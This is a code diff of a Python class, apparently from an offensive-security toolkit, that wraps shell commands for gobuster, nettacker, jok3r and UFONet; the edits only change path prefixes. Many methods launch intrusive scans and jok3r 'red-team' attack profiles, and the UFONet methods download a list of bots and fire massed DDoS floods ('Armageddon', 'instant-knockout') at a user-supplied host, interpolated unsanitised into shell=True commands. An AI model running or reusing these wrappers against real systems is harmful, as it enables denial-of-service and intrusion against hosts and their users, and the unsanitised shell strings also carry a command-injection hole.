@@ -50,7 +50,7 @@ class scanners(object):
 
     def gobuster(self, host):
         print(bcolors.BLUE + "~>[ " + bcolors.RED + "Mining root files on" + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
-        process = subprocess.Popen('gobuster dir vhost --debug --no-error --random-agent -w ./src/wordlists/content/big.txt -e -u %s' %(host), shell = True).wait()
+        process = subprocess.Popen('gobuster dir vhost --debug --no-error --random-agent -w src/wordlists/content/big.txt -e -u %s' %(host), shell = True).wait()
         print("\n")
         return process
 
@@ -101,93 +101,93 @@ class scanners(object):
 
     def owasp_1(self, host):
         print(bcolors.BLUE + "~>[ " + bcolors.RED + "Started port scan & wappalyzer" + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
-        process = subprocess.Popen('cd ./src/externals/nettacker/; python3 nettacker.py -i %s -m port_scan -t 100' %(host), shell = True).wait()
+        process = subprocess.Popen('cd src/externals/nettacker/; python3 nettacker.py -i %s -m port_scan -t 100' %(host), shell = True).wait()
         print("\n")
         return process
     def owasp_2(self, host):
         print(bcolors.BLUE + "~>[ " + bcolors.RED + "Started subdomains reconing" + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
-        process = subprocess.Popen('cd ./src/externals/nettacker/; python3 nettacker.py -i %s -m subdomain_scan' %(host), shell = True).wait()
+        process = subprocess.Popen('cd src/externals/nettacker/; python3 nettacker.py -i %s -m subdomain_scan' %(host), shell = True).wait()
         print("\n")
         return process
     def owasp_3(self, host):
         print(bcolors.BLUE + "~>[ " + bcolors.RED + "Launched admin_scan" + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
-        process = subprocess.Popen('cd ./src/externals/nettacker/; python3 nettacker.py -i %s -m scan', shell = True).wait()
+        process = subprocess.Popen('cd src/externals/nettacker/; python3 nettacker.py -i %s -m scan', shell = True).wait()
         print("\n")
         return process
     def owasp_4(self, host):
         print(bcolors.BLUE + "~>[ " + bcolors.RED + "Start information gathering" + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
-        process = subprocess.Popen('cd ./src/externals/nettacker/; python3 nettacker.py -i %s -m information_gathering -s', shell = True).wait()
+        process = subprocess.Popen('cd src/externals/nettacker/; python3 nettacker.py -i %s -m information_gathering -s', shell = True).wait()
         print("\n")
         return process
     def owasp_5(self, host):
         print(bcolors.BLUE + "~>[ " + bcolors.RED + "Start vulnscansecurity checks" + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
-        process = subprocess.Popen('cd ./src/externals/nettacker/; python3 nettacker.py -i %s -m server_version_vuln' %(host), shell = True).wait()
+        process = subprocess.Popen('cd src/externals/nettacker/; python3 nettacker.py -i %s -m server_version_vuln' %(host), shell = True).wait()
         print("\n")
         return process
     def owasp_6(self, host):
         print(bcolors.BLUE + "~>[ " + bcolors.RED + "Runing CVE scans on the target" + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
-        process = subprocess.Popen('cd ./src/externals/nettacker/; python3 nettacker.py -i %s -m cve' %(host), shell = True).wait()
+        process = subprocess.Popen('cd src/externals/nettacker/; python3 nettacker.py -i %s -m cve' %(host), shell = True).wait()
         print("\n")
         return process
     def owasp_7(self, host):
         print(bcolors.BLUE + "~>[ " + bcolors.RED + "Searching for (critical vulns & exploit) " + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
-        process = subprocess.Popen('cd ./src/externals/nettacker/; python3 nettacker.py -i %s -m high_severity' %(host), shell = True).wait()
+        process = subprocess.Popen('cd src/externals/nettacker/; python3 nettacker.py -i %s -m high_severity' %(host), shell = True).wait()
         print("\n")
         return process
     def owasp_8(self, host):
         print(bcolors.BLUE + "~>[ " + bcolors.RED + "Launched automated & intrusive checks" + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
-        process = subprocess.Popen('cd ./src/externals/nettacker/; python3 nettacker.py -i %s --profile all/results.txt', shell = True).wait()
+        process = subprocess.Popen('cd src/externals/nettacker/; python3 nettacker.py -i %s --profile all/results.txt', shell = True).wait()
         print("\n")
         return process
     def owasp_9(self, host):
         print(bcolors.BLUE + "~>[ " + bcolors.RED + "Launched WebUI (key: africana)" + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
-        process = subprocess.Popen('cd ./src/externals/nettacker/; python3 nettacker.py --start-api --api-access-key africana', shell = True).wait()
+        process = subprocess.Popen('cd src/externals/nettacker/; python3 nettacker.py --start-api --api-access-key africana', shell = True).wait()
         print("\n")
         return process
 
     def jok3r_1(self, host):
         print(bcolors.BLUE + "~>[ " + bcolors.RED + "Installing all jok3r tools (Pleas start be patient) " + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
-        process = subprocess.Popen('cd ./src/externals/jok3r/; /bin/bash ./install-all.sh', shell = True).wait()
+        process = subprocess.Popen('cd src/externals/jok3r/; /bin/bash install-all.sh', shell = True).wait()
         print("\n")
         return process
     def jok3r_2(self, host):
         print(bcolors.BLUE + "~>[ " + bcolors.RED + "Updating all the tools in the toolbox (Pleas start be patient) " + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
-        process = subprocess.Popen('cd ./src/externals/jok3r/; python3 jok3r.py toolbox --update-all --auto', shell = True).wait()
+        process = subprocess.Popen('cd src/externals/jok3r/; python3 jok3r.py toolbox --update-all --auto', shell = True).wait()
         print("\n")
         return process
     def jok3r_3(self, host):
         print(bcolors.BLUE + "~>[ " + bcolors.RED + "Showing all the tools in the toolbox " + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
-        process = subprocess.Popen('cd ./src/externals/jok3r/; python3 jok3r.py toolbox --show-all', shell = True).wait()
+        process = subprocess.Popen('cd src/externals/jok3r/; python3 jok3r.py toolbox --show-all', shell = True).wait()
         print("\n")
         return process
     def jok3r_4(self, host):
         print(bcolors.BLUE + "~>[ " + bcolors.RED + "Showing supported products for all services " + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
-        process = subprocess.Popen('cd ./src/externals/jok3r/; python3 jok3r.py info --services', shell = True).wait()
+        process = subprocess.Popen('cd src/externals/jok3r/; python3 jok3r.py info --services', shell = True).wait()
         print("\n")
         return process
     def jok3r_5(self, host):
         print(bcolors.BLUE + "~>[ " + bcolors.RED + "Performing a very fast-scan on " + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
-        process = subprocess.Popen('cd ./src/externals/jok3r/; python3 jok3r.py attack -t %s --profile fast-scan --fast' %(host), shell = True).wait()
+        process = subprocess.Popen('cd src/externals/jok3r/; python3 jok3r.py attack -t %s --profile fast-scan --fast' %(host), shell = True).wait()
         print("\n")
         return process
     def jok3r_6(self, host):
         print(bcolors.BLUE + "~>[ " + bcolors.RED + "Run all security checks against " + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
-        process = subprocess.Popen('cd ./src/externals/jok3r/; python3 jok3r.py attack -t %s --profile red-team --fast' %(host), shell = True).wait()
+        process = subprocess.Popen('cd src/externals/jok3r/; python3 jok3r.py attack -t %s --profile red-team --fast' %(host), shell = True).wait()
         print("\n")
         return process
     def jok3r_7(self, host):
         print(bcolors.BLUE + "~>[ " + bcolors.RED + "Searching for (critical vulns & easy to exploit) " + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
-        process = subprocess.Popen('cd ./src/externals/jok3r/; python3 jok3r.py attack -t %s --profile red-team --fast' %(host), shell = True).wait()
+        process = subprocess.Popen('cd src/externals/jok3r/; python3 jok3r.py attack -t %s --profile red-team --fast' %(host), shell = True).wait()
         print("\n")
         return process
     def jok3r_8(self, host):
         print(bcolors.BLUE + "~>[ " + bcolors.RED + "Showing the full results from the security checks " + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
-        process = subprocess.Popen('cd ./src/externals/jok3r/; xhost +; python3 jok3r.py db creds vulns mission hosts products services report quit; xhost -', shell = True).wait()
+        process = subprocess.Popen('cd src/externals/jok3r/; xhost +; python3 jok3r.py db creds vulns mission hosts products services report quit; xhost -', shell = True).wait()
         print("\n")
         return process
     def jok3r_9(self, host):
         print(bcolors.BLUE + "~>[ " + bcolors.RED + "Clean & interact with DB (commands; help or quit 2 exit.)" + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
-        process = subprocess.Popen('cd ./src/externals/jok3r/; python3 jok3r.py db "mission -d default"', shell = True).wait()
+        process = subprocess.Popen('cd src/externals/jok3r/; python3 jok3r.py db "mission -d default"', shell = True).wait()
         print("\n")
         return process
 
@@ -260,51 +260,51 @@ class scanners(object):
 
     def ufonet_1(self):
         print(bcolors.BLUE + "~>[ " + bcolors.RED + "Downloading list of bots from C.S" + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
-        process = subprocess.Popen('cd ./src/externals/ufonet/; python3 ufonet --download-zombies', shell = True).wait()
+        process = subprocess.Popen('cd src/externals/ufonet/; python3 ufonet --download-zombies', shell = True).wait()
         print("\n")
         return process
     def ufonet_2(self):
         print(bcolors.BLUE + "~>[ " + bcolors.RED + "Testing If bots are alive" + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
-        process = subprocess.Popen('cd ./src/externals/ufonet/; python3 ufonet -t ./botnet/zombies.txt', shell = True).wait()
+        process = subprocess.Popen('cd src/externals/ufonet/; python3 ufonet -t botnet/zombies.txt', shell = True).wait()
         print("\n")
         return process
     def ufonet_3(self, host):
         print(bcolors.BLUE + "~>[ " + bcolors.RED + "Launched Palantir 3.14 againist" + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
-        process = subprocess.Popen('cd ./src/externals/ufonet/; python3 ufonet -r "100" --threads "100" --loic "1000" --loris "1000" -a "%s"' %(host), shell = True).wait()
+        process = subprocess.Popen('cd src/externals/ufonet/; python3 ufonet -r "100" --threads "100" --loic "1000" --loris "1000" -a "%s"' %(host), shell = True).wait()
         print("\n")
         return process
     def ufonet_4(self, host):
         print(bcolors.BLUE + "~>[ " + bcolors.RED + "Launched Socking_waves (instant-knockout!) againist" + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
-        process = subprocess.Popen('cd ./src/externals/ufonet/; python3 ufonet -r "100" --threads "100" --nuke "10000" -a "%s"' %(host), shell = True).wait()
+        process = subprocess.Popen('cd src/externals/ufonet/; python3 ufonet -r "100" --threads "100" --nuke "10000" -a "%s"' %(host), shell = True).wait()
         print("\n")
         return process
     def ufonet_5(self, host):
         print(bcolors.BLUE + "~>[ " + bcolors.RED + "Launched xcom-1 (only DDoS) againist" + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
-        process = subprocess.Popen('cd ./src/externals/ufonet/; python3 ufonet -r "100" --threads "100" --spray "1000" --smurf "1000" --tachyon "1000" --monlist "1000" --fraggle "1000" --sniper "1000" -a "%s"' %(host), shell = True).wait()
+        process = subprocess.Popen('cd src/externals/ufonet/; python3 ufonet -r "100" --threads "100" --spray "1000" --smurf "1000" --tachyon "1000" --monlist "1000" --fraggle "1000" --sniper "1000" -a "%s"' %(host), shell = True).wait()
         print("\n")
         return process
     def ufonet_6(self, host):
         print(bcolors.BLUE + "~>[ " + bcolors.RED + "Launched xcom-2 (only DoS) againist" + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
-        process = subprocess.Popen('cd ./src/externals/ufonet/; python3 ufonet -r "100" --threads "100" --loic "1000" --loris "1000" --ufosyn "1000" --xmas "1000" --nuke "1000" --ufoack "1000" --uforst "1000" --droper "1000" --overlap "1000" --pinger "1000" --ufoudp "1000" -a "%s"' %(host), shell = True).wait()
+        process = subprocess.Popen('cd src/externals/ufonet/; python3 ufonet -r "100" --threads "100" --loic "1000" --loris "1000" --ufosyn "1000" --xmas "1000" --nuke "1000" --ufoack "1000" --uforst "1000" --droper "1000" --overlap "1000" --pinger "1000" --ufoudp "1000" -a "%s"' %(host), shell = True).wait()
         print("\n")
         return process
     def ufonet_7(self):
         while True:
             try:
                 print(bcolors.BLUE + "~>[ " + bcolors.RED + "Launched ufonet gui on http://localhost:9999" + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
-                process = subprocess.Popen('cd ./src/externals/ufonet/; python3 ufonet --gui', shell = True).wait()
+                process = subprocess.Popen('cd src/externals/ufonet/; python3 ufonet --gui', shell = True).wait()
                 print("\n")
                 return process
             except:
                 ddos(self)
     def ufonet_8(self):
         print(bcolors.BLUE + "~>[ " + bcolors.RED + "Started Grider (python3 ufonet --grider &)" + bcolors.BLUE + " ]" + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
-        process = subprocess.Popen('cd ./src/externals/ufonet/; python3 ufonet --grider', shell = True).wait()
+        process = subprocess.Popen('cd src/externals/ufonet/; python3 ufonet --grider', shell = True).wait()
         print("\n")
         return process
     def ufonet_9(self, host):
         print(bcolors.BLUE + "~>[ " + bcolors.RED + "Launched Armageddon! (with ALL!)" + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
-        process = subprocess.Popen('cd ./src/externals/ufonet/; python3 ufonet -r "100" --threads "100" --loic "1000" --loris "1000" --ufosyn "1000" --spray "1000" --smurf "1000" --xmas "1000" --nuke "1000" --tachyon "1000" --monlist "1000" --fraggle "1000" --sniper "1000" --ufoack "1000" --uforst "1000" --droper "1000" --overlap "1000" --pinger "1000" --ufoudp "1000" -a "%s"' %(host), shell = True).wait()
+        process = subprocess.Popen('cd src/externals/ufonet/; python3 ufonet -r "100" --threads "100" --loic "1000" --loris "1000" --ufosyn "1000" --spray "1000" --smurf "1000" --xmas "1000" --nuke "1000" --tachyon "1000" --monlist "1000" --fraggle "1000" --sniper "1000" --ufoack "1000" --uforst "1000" --droper "1000" --overlap "1000" --pinger "1000" --ufoudp "1000" -a "%s"' %(host), shell = True).wait()
         print("\n")
         return process
 
